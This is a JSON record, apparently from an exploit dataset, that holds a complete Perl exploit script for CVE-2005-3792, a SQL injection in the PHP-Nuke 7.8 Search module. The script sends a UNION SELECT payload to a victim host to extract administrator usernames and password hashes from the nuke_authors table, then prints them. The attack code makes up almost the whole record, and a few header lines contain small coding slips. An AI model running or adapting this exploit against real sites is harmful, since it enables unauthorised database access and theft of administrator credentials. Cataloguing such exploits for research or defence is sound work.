{
  "id": "1326",
  "title": "PHP-Nuke 7.8 Search Module - SQL Injection",
  "cve": "CVE-2005-3792",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl -w\r\nuse IO::Socket;\r\n\r\nif (@ARGV < 2)\r\n{\r\nprint \"*---------------------------------------*\\n\";\r\nprint \"* EXPLOIT for PHPNuke <=7.8 *\\n\";\r\nprint \"*---------------------------------------*\\n\\n\";\r\nprint \" Usage : \\n\";\r\nprint \" PHPNuke[1] HOST /[path_phpnuke] \\n\\n\";\r\nprint \" HOST - Host where is phpnuke example: localhost \\n\\n\";\r\nprint \" Example :\\n\\n\";\r\nprint \" PHPNuke[1] www.victim.com /phpnuke/html/ \\n\\n\";\r\nexit();\r\n}\r\n\r\n$HOST = $ARGV[0];\r\n$phpnuke_path = $ARGV[1];\r\n\r\nprint \"\\n\";\r\nprint \"Host : $HOST\\n\";\r\nprint \"phpnuke_path : $phpnuke_path\\n\";\r\nprint \"\\n\";\r\n$OK = 0;\r\n$modules = \"modules.php\";\r\n$query = \"name=Search&query=s%')/**/UNION/**/SELECT/**/0,pwd,0,aid,0,0,0,0,0,0/**/FROM/**/nuke_authors/*\";\r\n$length = length $query;\r\n$GET = $phpnuke_path . $modules;\r\nprint \"[*] Connecting at victim host [OK]\\n\";\r\n$send = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$HOST\", PeerPort => \"80\") || die \"[*] Connect [FAILED]\\n\";\r\nprint \"[*] Connected [OK]\\n\";\r\nprint \"[*] Sending exploit [OK]\\n\\n\";\r\nprint $send \"POST \".$GET.\" HTTP/1.0\\n\";\r\nprint $send \"Host: \".%HOST.\"\\n\";\r\nprint $send \"Referer: http://\".%HOST.$phpnuke_path.\"modules.php?name=Search \\r\\n\";\r\nprint $send \"User-Agent: Internet Explorer 6.0 [SR]\\n\";\r\nprint $send \"Content-Type: application/x-www-form-urlencoded\\n\";\r\nprint $send \"Content-Length: \".$length.\"\\n\\n\";\r\nprint $send $query;\r\nprint $send \"Cookie: lang=english\\r\\n\\r\\n\";\r\nprint $send \"Connection: close\\n\\n\";\r\n\r\nprint \"[*] Exploit send [OK]\\n\";\r\nprint \"[*] Wait for reply...[OK]\\n\";\r\nwhile ($answer = <$send>)\r\n{\r\nif ($answer =~ /=0\"><b>([^:]*)<\\/b>/ ) { \r\n$OK = 1;\r\nprint \"[*] Success [OK]\\n\";\r\nprint \"[*] USER: $1\\n\";\r\n}\r\nif ($answer =~ /=\\\"0\">([^:]*)<\\/a>/ ) { \r\n$OK = 1;\r\nprint \"[*] PASSWORD: $1\\n\";\r\n}\r\n}\r\nif ($OK == 0) { print \"[*] Exploit [FAILED]\\n\"; }\r\n\r\n# milw0rm.com [2005-11-16]",
  "url": "https://www.exploit-db.com/exploits/1326"
}